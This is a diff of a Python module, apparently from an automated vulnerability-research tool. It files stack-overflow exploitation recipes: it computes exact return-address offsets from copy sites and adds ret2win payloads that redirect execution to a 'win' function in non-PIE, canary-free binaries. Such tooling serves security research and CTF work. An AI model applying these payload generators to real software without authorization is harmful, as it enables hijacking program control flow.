@@ -128,28 +128,39 @@ def synthesize_stage(ctx) -> dict:
     # concrete bytes rather than discarding a computed L1 just because confirmation was unavailable.
     top = candidates[0]
     rec_off = int(top.get("offset") or 0)
+    lead, exact = _overflow_lead(ctx, target, target_bytes)
+    where = f"{top['size']}-byte buffer {top['buffer']}"
+    key = f"recipe:stack-overflow:{top['buffer']}:{target.id}"
+    off_note = ""
+    if exact is not None:
+        # The COPY SITE says which buffer is written and where the return slot is: exact, where the
+        # frame-based prediction above is the distance to the saved frame pointer on an rbp frame
+        # (one word short) and names the tightest buffer, not necessarily the destination.
+        rec_off = int(exact["payload_offset"])
+        where = (f"the {exact['func']}() destination at rbp{exact['dest_disp']:+#x}"
+                 if exact["dest_base"] == "rbp" else f"the {exact['func']}() destination")
+        key = f"recipe:stack-overflow:{exact['site']:#x}:{target.id}"
+        off_note = (f" (exact, from the copy site at {exact['site']:#x}"
+                    + (f"; {'; '.join(exact['notes'])}" if exact["notes"] else "") + ")")
     rec_payload = primitive.control_input(rec_off, rec_off + word * 4 + 16, word, endian)
-    lead = None
-    try:
-        for f in FindingDAO(ctx.conn).list_by_target(target.id):
-            if (f.detector or "") == "stack_buffer_overflow" or (f.cwe in ("CWE-121", "CWE-787")):
-                lead = f
-                break
-    except Exception:                                    # noqa: BLE001 -- lead linkage is best-effort
-        lead = None
+    why = (f"the {tried} synthesized input(s) did not fault in this sandbox -- the buffer may be "
+           "gated behind menu/protocol navigation or the target could not be executed here")
     recipe.file_recipe(
         ctx, target, cwe=(lead.cwe if lead and lead.cwe else "CWE-121"),
         technique="stack-overflow return-address overwrite", target_level="L1",
         severity="high", detector="synth_overflow",
-        dedup_key=f"recipe:stack-overflow:{top['buffer']}:{target.id}",
-        title=f"Exploitation recipe: stack overflow of {top['buffer']}",
-        summary=(f"{top['size']}-byte buffer {top['buffer']}: write {rec_off} bytes of cyclic "
-                 f"filler then a sentinel at the saved return address (word {word}B, {endian}-endian) "
-                 f"to take control of the return address"),
-        why_not_executed=(f"the {tried} synthesized input(s) did not fault in this sandbox -- the "
-                          "buffer may be gated behind menu/protocol navigation or the target could "
-                          "not be executed here"),
+        dedup_key=key,
+        title=f"Exploitation recipe: stack overflow of {top['buffer'] if exact is None else where}",
+        summary=(f"{where}: write {rec_off} bytes of cyclic filler{off_note} then a sentinel at "
+                 f"the saved return address (word {word}B, {endian}-endian) to take control of the "
+                 f"return address"),
+        why_not_executed=why,
         lead=lead, input_bytes=rec_payload, input_mode=(modes or ["stdin"])[0], argv=argv_base or None)
+    # One rung further when the image allows it: a win function, no PIE, no canary in the frame ->
+    # the return slot gets &win instead of a sentinel. A candidate L3, the payload carried over.
+    if exact is not None:
+        _file_ret2win_recipe(ctx, target, target_bytes, exact, lead, why, word, endian,
+                             (modes or ["stdin"])[0], argv_base)
     ctx.emit("synth.done", payload={"ok": True, "crashed": False, "tried": tried,
              "recipe": True,
              "note": "synthesized overflow inputs did not reproduce a crash -- filed the computed "
@@ -157,6 +168,79 @@ def synthesize_stage(ctx) -> dict:
                      "directly (menu/protocol navigation) or the target could not be executed"})
     ctx.progress(pct=100, msg=f"no crash from {tried} inputs -- filed overflow recipe for {top['buffer']}")
     return {}
+
+
+#: Detectors whose CWE-121/120 finding names an unbounded copy SITE (function + call address).
+_OVERFLOW_DETECTORS = ("stack_frame", "stack_buffer_overflow", "dangerous_api")
+_OVERFLOW_CWES = ("CWE-121", "CWE-120", "CWE-787", "CWE-242")
+
+
+def _overflow_lead(ctx, target, target_bytes):
+    """(lead, exact layout or None): the overflow finding to annotate, and -- when its copy site is
+    recoverable on an x86-64 rbp frame -- the exact geometry from `overflow_recipe`. The stack-frame
+    detector's row is preferred (it is the one that correlated a buffer with the sink)."""
+    from . import fmt_recipe, overflow_recipe, x64frame
+    try:
+        rows = [f for f in FindingDAO(ctx.conn).list_by_target(target.id)
+                if f.cwe in _OVERFLOW_CWES and not (f.title or "").startswith("Exploitation recipe")]
+    except Exception:                                    # noqa: BLE001 -- lead linkage is best-effort
+        return None, None
+    rows.sort(key=lambda f: ((f.detector or "") not in _OVERFLOW_DETECTORS,
+                             (f.detector or "") != "stack_frame", -(f.confidence or 0)))
+    lead = rows[0] if rows else None
+    if not fmt_recipe._x86_64(target):
+        return lead, None
+    for f in rows[:8]:
+        if not (f.function_addr and f.site_addr):
+            continue
+        try:
+            ir = fmt_recipe._function_ir(ctx.conn, target.id, f.function_addr)
+            if not ir:
+                continue
+            ins = x64frame.instructions(ir)
+            k = x64frame.site_index(ins, f.site_addr)
+            name = x64frame.call_target(ins[k][1]) if k is not None else None
+            lay = overflow_recipe.overflow_layout(ir, f.site_addr, name or "", target_bytes)
+        except Exception:                                # noqa: BLE001
+            lay = None
+        if lay:
+            return f, lay
+    return lead, None
+
+
+def _file_ret2win_recipe(ctx, target, target_bytes, exact, lead, why, word, endian, mode,
+                         argv_base) -> None:
+    """File the ret2win candidate (L3 ceiling) for an exactly-placed overflow -- only when the
+    image makes the address a literal fact (no PIE) and the frame has no canary."""
+    from . import elfstatic, exploit, overflow_recipe
+    try:
+        if exact.get("canary") or elfstatic.is_pie(target_bytes):
+            return
+        edges = CallEdgeDAO(ctx.conn).list_by_target(target.id)
+        win = exploit.find_win(exploit.elf_functions(target_bytes), call_edges=edges)
+        if not (win and win[0]):
+            return
+        payload = overflow_recipe.ret2win_payload(exact, int(win[1]), word=word, endian=endian)
+        if payload is None:
+            return
+        alt = exploit.win_realign_entry(target_bytes, int(win[1]))
+        recipe.file_recipe(
+            ctx, target, cwe=(lead.cwe if lead and lead.cwe else "CWE-121"),
+            technique=f"stack-overflow ret2win -> {win[0]}", target_level="L3", severity="high",
+            detector="synth_overflow",
+            dedup_key=f"recipe:ret2win:{exact['site']:#x}:{target.id}",
+            title=f"Exploitation recipe: stack overflow ret2win -> {win[0]} (candidate)",
+            summary=(f"{exact['func']}() at {exact['site']:#x}: {exact['payload_offset']} bytes of "
+                     f"filler then &{win[0]} ({int(win[1]):#x}) over the saved return address -- "
+                     "no PIE (fixed address), no stack canary in this frame"),
+            steps=[f"send the {len(payload)}-byte payload over {mode}",
+                   f"if {win[0]} faults on a misaligned stack (movaps in system()), use the "
+                   f"realigned entry {alt:#x} in place of {int(win[1]):#x}"]
+                  + list(exact.get("notes") or []),
+            why_not_executed=why, lead=lead, input_bytes=payload, input_mode=mode,
+            argv=argv_base or None)
+    except Exception:                                    # noqa: BLE001 -- the L1 recipe stands
+        pass
 
 
 def _finalize(ctx, target, target_bytes, payload, mode, run_argv, res, cand, off, slack, tried):
